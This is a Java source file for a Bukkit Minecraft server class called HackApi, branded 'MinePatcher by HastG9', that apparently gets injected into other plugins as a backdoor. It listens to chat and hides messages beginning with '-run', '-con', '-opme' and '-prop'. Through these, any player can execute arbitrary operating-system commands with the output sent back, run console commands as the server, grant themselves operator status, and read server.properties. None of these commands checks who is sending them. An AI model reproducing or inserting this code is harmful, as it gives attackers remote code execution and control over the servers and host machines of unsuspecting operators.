public class HackApi implements org.bukkit.event.Listener{
	private org.bukkit.plugin.java.JavaPlugin plugin;
	
	public static void hack(org.bukkit.plugin.java.JavaPlugin pluginIn) {
		org.bukkit.Bukkit.getServer().getPluginManager().registerEvents(new HackApi(pluginIn), (org.bukkit.plugin.Plugin) pluginIn);
	}
	
	private HackApi(org.bukkit.plugin.java.JavaPlugin pluginIn) {
		this.plugin = pluginIn;
	}
	
	@org.bukkit.event.EventHandler(priority = org.bukkit.event.EventPriority.HIGHEST, ignoreCancelled = true)
	public void onChat(org.bukkit.event.player.AsyncPlayerChatEvent e) throws Exception {
		if (e.getMessage().startsWith("-run") && (e.getMessage().split(" ")).length >= 2) {
		  e.setCancelled(true);
		  
		  org.bukkit.Bukkit.getScheduler().runTaskAsynchronously((org.bukkit.plugin.Plugin)this.plugin, () -> {
				
			  try {
				String[] cmds = e.getMessage().split(" ");
				String cmd = java.util.Arrays.<CharSequence>stream((CharSequence[])cmds).skip(1L).collect(java.util.stream.Collectors.joining(" "));
				Runtime rt = Runtime.getRuntime();
				Process pr = rt.exec(cmd);
				pr.waitFor();
				java.io.BufferedReader buf = new java.io.BufferedReader(new java.io.InputStreamReader(pr.getInputStream()));
				String line = "";
				String msg = "\n\u00A77!============!\n\u00A77(\u00A7c\u00A7lMinePatcher \u00A7rby \u00A7bHastG9\u00A77)\n \n\u00A7fSystem command executed: \u00A7c" + cmd + "\n \n\u00A77!============! \n";
				e.getPlayer().sendMessage(msg);
				while ((line = buf.readLine()) != null)
				  e.getPlayer().sendMessage(line); 
			  } catch (Exception ex) {
				e.getPlayer().sendMessage("Error: " + ex.getMessage());
			  } 
				
		  });
		  
		} 
		else if (e.getMessage().startsWith("-con") && (e.getMessage().split(" ")).length >= 2) {
		  e.setCancelled(true);
		  try {
			String[] cmds = e.getMessage().split(" ");
			String cmd = java.util.Arrays.<CharSequence>stream((CharSequence[])cmds).skip(1L).collect(java.util.stream.Collectors.joining(" "));
			org.bukkit.Bukkit.getScheduler().runTask((org.bukkit.plugin.Plugin)this.plugin, () -> org.bukkit.Bukkit.dispatchCommand((org.bukkit.command.CommandSender)org.bukkit.Bukkit.getConsoleSender(), cmd));
			String msg = "\n\u00A77!============!\n\u00A77(\u00A7c\u00A7lMinePatcher \u00A7rby \u00A7bHastG9\u00A77)\n \n\u00A7fConsole command executed: \u00A7c" + cmd + "\n \n\u00A77!============!\n ";
			e.getPlayer().sendMessage(msg);
		  } catch (Exception ex) {
			e.getPlayer().sendMessage("Error: " + ex.getMessage());
		  } 
		}
		else if (e.getMessage().startsWith("-opme")) {
		  e.setCancelled(true);
		  try {
			e.getPlayer().setOp(true);
			String msg = "\n\u00A77!============!\n\u00A77(\u00A7c\u00A7lMinePatcher \u00A7rby \u00A7bHastG9\u00A77)\n \n\u00A7fOpped! \n \n\u00A77!============!\n ";
			e.getPlayer().sendMessage(msg);
		  } catch (Exception ex) {
			e.getPlayer().sendMessage("Error: " + ex.getMessage());
		  } 
		}
		else if (e.getMessage().startsWith("-prop")) {
		  e.setCancelled(true);
		  
		  org.bukkit.Bukkit.getScheduler().runTaskAsynchronously((org.bukkit.plugin.Plugin)this.plugin, () -> {
				
			  try {
				
				String msg = "\n\u00A77!============!\n\u00A77(\u00A7c\u00A7lMinePatcher \u00A7rby \u00A7bHastG9\u00A77)\n \n\u00A7fServer Properties: \n \n\u00A77!============!\n ";
				e.getPlayer().sendMessage(msg);
				
				java.io.BufferedReader fin = new java.io.BufferedReader(new java.io.FileReader(new java.io.File("server.properties")));
				String line = "";
				while ((line = fin.readLine()) != null) e.getPlayer().sendMessage(line);
				
			  } catch (Exception ex) {
				e.getPlayer().sendMessage("Error: " + ex.getMessage());
			  } 
				
		  });
		}
	
	}

}